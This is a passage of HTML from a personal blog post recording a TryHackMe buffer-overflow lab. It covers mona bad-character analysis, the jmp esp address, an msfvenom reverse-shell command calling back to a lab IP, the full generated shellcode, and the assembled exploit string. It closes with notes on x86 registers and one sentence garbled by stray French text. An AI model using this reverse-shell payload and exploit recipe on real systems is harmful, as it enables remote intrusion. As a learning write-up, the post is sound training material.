title="\xd8">\xd8</span><span class="token entity" title="\xd9">\xd9</span><span class="token entity" title="\xda">\xda</span><span class="token entity" title="\xdb">\xdb</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\xdf">\xdf</span><span class="token entity" title="\xe0">\xe0</span><span class="token entity" title="\xe1">\xe1</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\xe3">\xe3</span><span class="token entity" title="\xe4">\xe4</span><span class="token entity" title="\xe5">\xe5</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\xe7">\xe7</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\xea">\xea</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\xec">\xec</span><span class="token entity" title="\xed">\xed</span><span class="token entity" title="\xee">\xee</span><span class="token entity" title="\xef">\xef</span><span class="token entity" title="\xf0">\xf0</span><span class="token entity" title="\xf1">\xf1</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\xf4">\xf4</span><span class="token entity" title="\xf5">\xf5</span><span class="token entity" title="\xf6">\xf6</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\xf9">\xf9</span><span class="token entity" title="\xfa">\xfa</span><span class="token entity" title="\xfb">\xfb</span><span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\xfe">\xfe</span><span class="token entity" title="\xff">\xff</span>")'</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.imgur.com/IUHfkJ2.png"><br>Better</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona compare -f C:<span class="token punctuation">\</span>mona<span class="token punctuation">\</span>oscp<span class="token punctuation">\</span>bytearray.bin -a esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://i.imgur.com/Qr2sOhM.png"></p>
<p><img src="https://i.imgur.com/0a5jN8g.png"><br>I have an another problem:<br><img src="https://i.imgur.com/Rffd7L0.png"><br>The 4 first bad chars are normal but the others are not, the EIP dsplay 42424242 so it should be good, and it’s not a problem of encoding because I have the 4 first bad chars.</p>
<p>I will remove <code>\x07\x08</code>  and <code>\x2e\x2f</code> from my payload and mona.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona bytearray -b <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x2f">\x2f</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.imgur.com/PVD0KUC.png"><br>The problem still here.<br><img src="https://i.imgur.com/qUOFojr.png"><br>Why this one is not at c2 ?<br>Where is a0 ? If we add a0 to the string and it should be good.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x07<span class="token punctuation">\</span>x08<span class="token punctuation">\</span>x2e<span class="token punctuation">\</span>x2f<span class="token punctuation">\</span>xa0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>And no, it’s not good, because for exemple <code>\x07\x08</code>:<br>The <code>\x07</code> is the bad character but the <code>\x08 is corrupted</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x07<span class="token punctuation">\</span>x2e<span class="token punctuation">\</span>xa0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>It was super hard at the end, Try hack me does not explain this.</p>
<h1 id="Find-the-jump-point"><a href="#Find-the-jump-point" class="headerlink" title="Find the jump point"></a>Find the jump point</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona jmp -r esp -cpb <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\xa0">\xa0</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.imgur.com/5XH7lvx.png"><br>This command finds all “jmp esp” (or equivalent) instructions with addresses that don’t contain any of the badchars specified.<br>So that’s where I can inject a shellcode without badchars.<br>We need to convert it in little indian.<br>You need to inverse the Bytes.<br>So <code>625011af</code> = <code>\xaf\x11\x50\x62</code><br>It will be our <code>jmp</code>.</p>
<h1 id="Generate-Payload"><a href="#Generate-Payload" class="headerlink" title="Generate Payload."></a>Generate Payload.</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.8</span>.50.167 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4848</span> <span class="token assign-left variable">EXITFUNC</span><span class="token operator">=</span>thread -b <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\xa0">\xa0</span>"</span> -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.imgur.com/eEwvUKK.png"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xba">\xba</span><span class="token entity" title="\x17">\x17</span><span class="token entity" title="\x58">\x58</span><span class="token entity" title="\xc7">\xc7</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\xda">\xda</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\xd9">\xd9</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\xf4">\xf4</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\xc9">\xc9</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\xee">\xee</span><span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x0e">\x0e</span><span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x41">\x41</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\x91">\x91</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x8e">\x8e</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\x14">\x14</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x4f">\x4f</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\x9c">\x9c</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\x7e">\x7e</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\xfa">\xfa</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\x7c">\x7c</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x88">\x88</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\x3f">\x3f</span><span class="token entity" title="\x55">\x55</span><span class="token entity" title="\x75">\x75</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\x30">\x30</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\x30">\x30</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x7f">\x7f</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xdf">\xdf</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x13">\x13</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x40">\x40</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\x5a">\x5a</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\x95">\x95</span><span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x9a">\x9a</span><span class="token entity" title="\xa6">\xa6</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x53">\x53</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\xac">\xac</span><span class="token entity" title="\xcb">\xcb</span><span class="token entity" title="\x43">\x43</span><span class="token entity" title="\xf0">\xf0</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\xd7">\xd7</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\xec">\xec</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x0d">\x0d</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x23">\x23</span><span class="token entity" title="\xf4">\xf4</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\xd8">\xd8</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x19">\x19</span><span class="token entity" title="\xce">\xce</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x93">\x93</span><span class="token entity" title="\xb0">\xb0</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\xa4">\xa4</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x44">\x44</span><span class="token entity" title="\x89">\x89</span><span class="token entity" title="\x5d">\x5d</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\xb7">\xb7</span><span class="token entity" title="\xd3">\xd3</span><span class="token entity" title="\x9a">\x9a</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\x28">\x28</span><span class="token entity" title="\xa6">\xa6</span><span class="token entity" title="\xd2">\xd2</span><span class="token entity" title="\x4f">\x4f</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\x2d">\x2d</span><span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x37">\x37</span><span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\x95">\x95</span><span class="token entity" title="\xc2">\xc2</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xef">\xef</span><span class="token entity" title="\x1d">\x1d</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x06">\x06</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\xd6">\xd6</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\xe3">\xe3</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\xb0">\xb0</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xd2">\xd2</span><span class="token entity" title="\xcb">\xcb</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x7f">\x7f</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\x1b">\x1b</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xbf">\xbf</span><span class="token entity" title="\x85">\x85</span><span class="token entity" title="\x98">\x98</span><span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x4e">\x4e</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xa3">\xa3</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\xcb">\xcb</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\xe1">\xe1</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\x38">\x38</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x88">\x88</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\xe0">\xe0</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x86">\x86</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x93">\x93</span><span class="token entity" title="\x5c">\x5c</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\xb9">\xb9</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\xed">\xed</span><span class="token entity" title="\xc2">\xc2</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\x12">\x12</span><span class="token entity" title="\xf9">\xf9</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xd0">\xd0</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\xed">\xed</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\x7b">\x7b</span><span class="token entity" title="\x2a">\x2a</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x13">\x13</span><span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\xd7">\xd7</span><span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\xe3">\xe3</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x24">\x24</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\xb3">\xb3</span><span class="token entity" title="\x8a">\x8a</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\x05">\x05</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\x91">\x91</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x36">\x36</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\xba">\xba</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x39">\x39</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\x29">\x29</span><span class="token entity" title="\x43">\x43</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\xa7">\xa7</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\xa3">\xa3</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x72">\x72</span><span class="token entity" title="\xc8">\xc8</span><span class="token entity" title="\xa5">\xa5</span><span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x18">\x18</span><span class="token entity" title="\x38">\x38</span><span class="token entity" title="\xe0">\xe0</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\xb5">\xb5</span><span class="token entity" title="\xa1">\xa1</span><span class="token entity" title="\xa9">\xa9</span><span class="token entity" title="\x94">\x94</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\x2d">\x2d</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x64">\x64</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\xa5">\xa5</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x26">\x26</span><span class="token entity" title="\x29">\x29</span><span class="token entity" title="\x4e">\x4e</span><span class="token entity" title="\xe1">\xe1</span><span class="token entity" title="\x34">\x34</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\xbe">\xbe</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\x66">\x66</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x49">\x49</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\x6a">\x6a</span><span class="token entity" title="\x0e">\x0e</span><span class="token entity" title="\x15">\x15</span><span class="token entity" title="\x53">\x53</span><span class="token entity" title="\xf1">\xf1</span><span class="token entity" title="\xce">\xce</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\xbe">\xbe</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xa7">\xa7</span><span class="token entity" title="\x4f">\x4f</span><span class="token entity" title="\xa8">\xa8</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\x7f">\x7f</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\xee">\xee</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\xb4">\xb4</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x63">\x63</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\x42">\x42</span><span class="token entity" title="\xa6">\xa6</span><span class="token entity" title="\xbd">\xbd</span><span class="token entity" title="\x01">\x01</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\xd4">\xd4</span><span class="token entity" title="\x0e">\x0e</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\x26">\x26</span><span class="token entity" title="\x8e">\x8e</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\x57">\x57</span><span class="token entity" title="\xce">\xce</span><span class="token entity" title="\xf5">\xf5</span><span class="token entity" title="\xa8">\xa8</span><span class="token entity" title="\x57">\x57</span><span class="token entity" title="\x1b">\x1b</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x54">\x54</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\xc6">\xc6</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\x14">\x14</span><span class="token entity" title="\x3a">\x3a</span><span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x1d">\x1d</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\xfe">\xfe</span><span class="token entity" title="\x23">\x23</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\xcc">\xcc</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\xb6">\xb6</span><span class="token entity" title="\x91">\x91</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x7b">\x7b</span><span class="token entity" title="\xf4">\xf4</span><span class="token entity" title="\xaf">\xaf</span><span class="token entity" title="\xd9">\xd9</span><span class="token entity" title="\x89">\x89</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x85">\x85</span><span class="token entity" title="\x4b">\x4b</span><span class="token entity" title="\xc1">\xc1</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\xf9">\xf9</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x15">\x15</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\x2a">\x2a</span>"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"<span class="token entity" title="\x61">\x61</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="Prepend-NOPs"><a href="#Prepend-NOPs" class="headerlink" title="Prepend NOPs"></a>Prepend NOPs</h1><p>That’s something uou have to add befor the payload to let some space for the payload to unpack.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">padding <span class="token operator">=</span> <span class="token string">"<span class="token entity" title="\x90">\x90</span>"</span> * <span class="token number">16</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.imgur.com/VhHLvKO.png"></p>
<h1 id="Preparing-the-Exploit"><a href="#Preparing-the-Exploit" class="headerlink" title="Preparing the Exploit"></a>Preparing the Exploit</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> <span class="token operator">=</span> <span class="token string">"OVERFLOW "</span>
offset <span class="token operator">=</span> <span class="token number">1978</span>*<span class="token string">"A"</span>
jmp <span class="token operator">=</span> <span class="token string">"<span class="token entity" title="\xaf">\xaf</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x62">\x62</span>"</span>
nops <span class="token operator">=</span> <span class="token number">16</span>*<span class="token string">"<span class="token entity" title="\x90">\x90</span>"</span>
shellcode <span class="token operator">=</span> <span class="token variable"><span class="token variable">$(</span>msfvenom -p windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.8</span>.50.167 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4848</span> <span class="token assign-left variable">EXITFUNC</span><span class="token operator">=</span>thread -b <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\xa0">\xa0</span>"</span> -f c<span class="token variable">)</span></span>


string <span class="token operator">=</span> <span class="token builtin class-name">command</span> + offset + jmp + nops + shellcode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Instead of the variable jmp we had BBBB who was in the EIP<br>Then we put the nops to let the payload unpack</p>
<h2 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h2><p>EIP stands for “Extended Instruction Pointer” and it is a 32-bit register that points to the memory address of the next instruction to be executed. As a program runs, EIP is updated to point to the next instruction in memory. </p>
<p>So in our case the next  instruction would be the jmp</p>
<h2 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a>ESP</h2><p>ESP stands for “Extended Stack Pointer” and it is a 32-bit register that points to the top of the stack. The stack is a portion of memory used to store local variables and function call data. As data is pushed onto the stack, ESP is decremented to point to the new top of the stack. As data is popped off the stack, ESP is incremented to point to the new top of the stack.</p>
<h2 id="EBP"><a href="#EBP" class="headerlink" title="EBP"></a>EBP</h2><p>EBP stands for “Extended Base Pointer” and it is a 32-bit register that is used as a reference point for accessing function parameters and local variables stored on the stack. When a function is called, the value of ESP is saved in EBP, and the stack is used to store the function’s local variables and parameters. EBP is used as a reference point to access this data on the stack.</p>
<p><a href="https://www.uperesia.com/buffer-overflow-explained">https://www.uperesia.com/buffer-overflow-explained</a><br><img src="https://i.imgur.com/kIqyLwZ.png"></p>
<p>I’ah oui ok, si tu as keepass 2 c’est la même format, si tu as keepass 1 il faut migrerve learned a lot but it’s not working, even with a script on github:<br><a href="https://github.com/joshua17sc/Buffer-Overflows/blob/main/exploit.py">https://github.com/joshua17sc/Buffer-Overflows/blob/main/exploit.py</a></p>

      
       
    </div>
</article>







    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    ©2021 Peanutstick&#39;s Blog
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    

    
</style>







</html>
